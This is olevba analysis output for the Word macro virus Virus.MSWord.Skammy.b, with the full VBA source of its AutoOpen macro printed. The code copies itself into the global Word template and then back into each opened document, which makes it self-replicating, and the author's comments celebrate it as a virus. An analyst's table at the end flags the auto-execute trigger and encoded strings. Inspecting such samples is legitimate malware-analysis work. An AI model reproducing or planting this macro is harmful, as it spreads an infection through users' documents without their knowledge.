olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Skammy.b-dc9e0f77789a8a6ab7e0a9acd1feb1aa7f075334
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Skammy.b-dc9e0f77789a8a6ab7e0a9acd1feb1aa7f075334 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Skammy.b-dc9e0f77789a8a6ab7e0a9acd1feb1aa7f075334 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the JuJu Created by JuJu141

On Error GoTo -1: On Error GoTo ErrorHandler

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     WordBasic.MacroCopy MacName$, "Global:AutoOpen"
     WordBasic.MacroCopy MacName$, "Global:Skammy"

ErrorHandler:

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$
AutoOpenHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$
OtherNameHandler:
    
WordBasic.FileSaveAs Format:=1

Rem Virii Unite!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

